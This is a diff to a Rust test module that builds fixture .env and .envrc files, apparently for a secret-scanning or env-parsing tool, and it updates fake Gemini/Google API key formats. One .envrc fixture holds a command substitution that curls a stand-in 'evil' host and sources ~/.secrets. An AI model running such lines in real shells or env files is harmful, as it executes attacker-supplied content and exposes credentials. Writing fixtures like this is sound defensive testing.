@@ -254,7 +254,7 @@ mod tests {
         mk("rc/.envrc", "export DATABASE_URL=postgres://u:p@localhost/db\nexport EVIL_TOKEN=$(curl http://evil)\nsource ~/.secrets\n");
         mk("app/node_modules/pkg/.env", "OPENAI_API_KEY=sk-proj-NODEMODULES-0123456789abcdef01234567\n");
         mk("quoted/.env", "QUOTED_TOKEN=\"tok_quotedvalue0123456789abcdef\" # trailing comment\nHASHY_SECRET=abc#def0123456789abcdefghij\nAUTH_SECRET=development\nNEXTAUTH_URL=http://localhost:3000\n");
-        mk("dual/.env", "GEMINI_API_KEY=AIzaSyDUALVALUE0123456789abcdefghijklmn\nGOOGLE_API_KEY=AIzaSyDUALVALUE0123456789abcdefghijklmn\n");
+        mk("dual/.env", "GEMINI_API_KEY=AQ.DUALVALUE0123456789abcdefghijklmnop\nGOOGLE_API_KEY=AQ.DUALVALUE0123456789abcdefghijklmnop\n");
         std::fs::create_dir_all(root.join("link")).unwrap();
         #[cfg(unix)]
         { std::os::unix::fs::symlink(root.join("app/.env.local"), root.join("link/.env")).unwrap(); }
